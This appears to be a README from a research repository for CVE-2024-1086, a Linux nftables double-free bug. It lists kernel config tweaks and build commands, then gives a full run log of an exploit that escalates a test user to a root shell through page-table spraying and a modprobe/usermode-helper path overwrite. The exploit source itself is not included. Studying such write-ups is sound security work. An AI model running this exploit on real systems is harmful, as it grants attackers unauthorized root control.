
# CVE-2024-1086

For learning purpose.

Refer:
- https://pwning.tech/nftables/
- https://github.com/Notselwyn/CVE-2024-1086

Kconfig:
```diff
+CONFIG_CONFIGFS_FS=y
+CONFIG_SECURITYFS=y
+CONFIG_NF_TABLES=y
# mnl_cb_run: Operation not supported
+CONFIG_NETFILTER_NETLINK_GLUE_CT=y
+CONFIG_NETLINK_DIAG=y
+CONFIG_NFT_CT=y
+CONFIG_NF_TABLES_IPV4=y

-CONFIG_X86_5LEVEL=y
+CONFIG_PGTABLE_LEVELS=4

+CONFIG_STATIC_USERMODEHELPER=y
+CONFIG_STATIC_USERMODEHELPER_PATH="/sbin/usermode-helper"
-CONFIG_SLAB_MERGE_DEFAULT=y
+CONFIG_SLAB_FREELIST_RANDOM=y
+CONFIG_SLAB_FREELIST_HARDENED=y
+CONFIG_SHUFFLE_PAGE_ALLOCATOR=y

-CONFIG_KASAN=y
-CONFIG_KASAN_GENERIC=y
-CONFIG_KASAN_INLINE=y
-CONFIG_KASAN_STACK=y
```

Build:
```bash
apt install -y libnftnl-dev libmnl-dev
gcc exp.c -o exp -lnftnl -lmnl
```

Exp 🍻:
```
test@syzkaller:~$ uname -a
Linux syzkaller 6.3.0-00001-ge449dbb06b7b #31 SMP PREEMPT_DYNAMIC Mon Dec 16 23:45:41 CST 2024 x86_64 GNU/Linux
test@syzkaller:~$ ./exp
[+] creating user namespace (CLONE_NEWUSER)...
[+] creating network namesapce (CLONE_NEWNET)...
[+] setting up UID namespace...
[+] mapping uid 1000 to namespace uid 0...
[+] deny namespace rights to set user groups...
[+] mapping gid 1000 to namespace gid 0...
[+] configuring localhost in namespace...
[+] disbaling RPF in network namespace...
[+] disabling rpf for interface: 'lo'
[+] disabling rpf for interface: 'sit0'
[+] setting up nftables...
[+] allocating netfilter objects...
[+] sending nftables tables/chains/rules/expr using netlink...
[+] running normal privesc
[+] doing first useless allocs to setup caching and stuff..
[+] allocated VMAs for process:
  - pte_area: ?
  - _pmd_area: 0x80000000
  - modprobe_path: '/sbin/modprobe' @ 0x7ffdfb220ea0
[+] sending intermediate buffer packet...
[+] sending IP packet (32796 bytes)...
[+] waiting for the clam before the storm...
[+] start to reserve udp packets 170
[+] sending double free buffer packet...
[+] sending IP packet (32796 bytes)...
[+] start to free reserved udp packets to mask corrupted packet 170
[+] spraying 16000 pte's...
[+] double-freeing skb...
[+] sending intermediate buffer packet...
[+] sending IP packet (20 bytes)...
[   78.851572] ------------[ cut here ]------------
[   78.851936] WARNING: CPU: 0 PID: 218 at mm/slab_common.c:935 free_large_kmalloc+0x5e/0x90
[   78.852409] Modules linked in:
[   78.852692] CPU: 0 PID: 218 Comm: exp Not tainted 6.3.0-00001-ge449dbb06b7b #31
[   78.852867] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   78.852867] RIP: 0010:free_large_kmalloc+0x5e/0x90
[   78.853565] Code: 45 00 be 06 00 00 00 48 c1 e8 3a 48 8b 3c c5 e0 cf c9 82 e8 64 5e ff ff 44 89 e6 48 89 ef 48 83 c4 08 5d 41 5c e9 12 44 03 00 <0f> 0b 45 31 e4 80 3d a7 0c a7 01 00 48 c78
[   78.854277] RSP: 0018:ffff88813bc05d20 EFLAGS: 00000246
[   78.854470] RAX: 0200000000000000 RBX: 0000000000000000 RCX: 0000000000000000
[   78.854641] RDX: 0000000000000000 RSI: ffff88810ab10000 RDI: ffffea00042ac400
[   78.854806] RBP: ffffea00042ac400 R08: ffff88810aab7450 R09: 0000000000000001
[   78.855119] R10: ffff88810018d490 R11: ffff88813bc2b270 R12: 0000000000000002
[   78.855291] R13: ffff88810aabd900 R14: ffff88810aab7450 R15: 0000000000000014
[   78.855509] FS:  00007f09941f8740(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[   78.855731] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   78.856008] CR2: 00000087cfe00000 CR3: 0000000102fd0000 CR4: 00000000000006f0
[   78.856305] Call Trace:
[   78.857067]  <IRQ>
[   78.857449]  skb_release_data+0xea/0x1c0
[   78.857695]  kfree_skb_reason+0x4b/0x110
[   78.857801]  inet_frag_rbtree_purge+0x4f/0x80
[   78.858405]  inet_frag_destroy+0x49/0x80
[   78.858535]  ip_defrag+0x4ce/0x840
[   78.858644]  ip_local_deliver+0x50/0x120
[   78.858928]  ? ip_rcv+0xd7/0x170
[   78.859032]  __netif_receive_skb_one_core+0x86/0xa0
[   78.859181]  process_backlog+0x98/0x140
[   78.859280]  __napi_poll+0x27/0x1b0
[   78.859390]  net_rx_action+0x28a/0x2e0
[   78.859483]  __do_softirq+0xc0/0x290
[   78.859625]  do_softirq+0x62/0x90
[   78.859932]  </IRQ>
[   78.860011]  <TASK>
[   78.860064]  __local_bh_enable_ip+0x59/0x70
[   78.860197]  ip_finish_output2+0x182/0x500
[   78.860429]  ? __pfx_ip_finish_output+0x10/0x10
[   78.860578]  raw_sendmsg+0xccb/0xce0
[   78.860696]  ? common_interrupt+0x13/0xa0
[   78.860812]  ? __pfx_dst_output+0x10/0x10
[   78.860831]  ? sock_sendmsg+0x8a/0xa0
[   78.860831]  ? __pfx_raw_sendmsg+0x10/0x10
[   78.860831]  sock_sendmsg+0x8a/0xa0
[   78.860831]  ? move_addr_to_kernel.part.0+0x16/0x60
[   78.860831]  __sys_sendto+0xfb/0x170
[   78.860831]  ? vfs_write+0x1a8/0x3a0
[   78.860831]  __x64_sys_sendto+0x1f/0x30
[   78.861832]  do_syscall_64+0x3f/0x90
[   78.861944]  entry_SYSCALL_64_after_hwframe+0x72/0xdc
[   78.862257] RIP: 0033:0x7f09942f8046
[   78.862593] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec9
[   78.863251] RSP: 002b:00007ffdfb220d88 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   78.863490] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f09942f8046
[   78.863637] RDX: 0000000000000014 RSI: 0000557f4b4e6300 RDI: 0000000000000005
[   78.863786] RBP: 00007ffdfb220db0 R08: 00007ffdfb220de0 R09: 0000000000000010
[   78.864158] R10: 0000000000000000 R11: 0000000000000246 R12: 0000557f4b4e05b0
[   78.864496] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[   78.864863]  </TASK>
[   78.865130] ---[ end trace 0000000000000000 ]---
[   78.865559] object pointer: 0x00000000f3fec870
[+] checking 16000 sprayed pte's for overlap...
[+] confirmed double alloc PMD/PTE
    - PTE area index: 68
    - PTE area (write target address/page: 8000000111fcc067 (new)
[+] flush tlb thread gonna sleep
    - PMD area (read target value/page): f000ff53f000ff53 (new)
[   78.979646] memfd_create() without MFD_EXEC nor MFD_NOEXEC_SEAL, pid=218 'exp'
[+] flush tlb thread gonna sleep
[+] found possible physical kernel base: 0000000001000000
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] flush tlb thread gonna sleep
[+] verified modprobe_path/usermodehelper_path: 000000000268611c ('/sbin/usermode-helper')...
[+] overwriting path with PIDs in range 0->4194304...
[   80.401031] process 'exp' launched '/dev/fd/13' with NULL argv: empty string added
[   80.711688] audit: type=1400 audit(1734370080.435:6): avc:  denied  { write } for  pid=451 comm="11" name="fd" dev="proc" ino=885 scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:1
[   80.712534] audit: type=1400 audit(1734370080.435:7): avc:  denied  { add_name } for  pid=451 comm="11" name="12" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:system_r:kernel_1
[   80.712810] audit: type=1400 audit(1734370080.436:8): avc:  denied  { create } for  pid=451 comm="11" name="12" scontext=system_u:system_r:kernel_t:s0 tcontext=system_u:object_r:kernel_t:1
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0
# exit
[+] successfully breached the mainframe as read-PID 218
```
 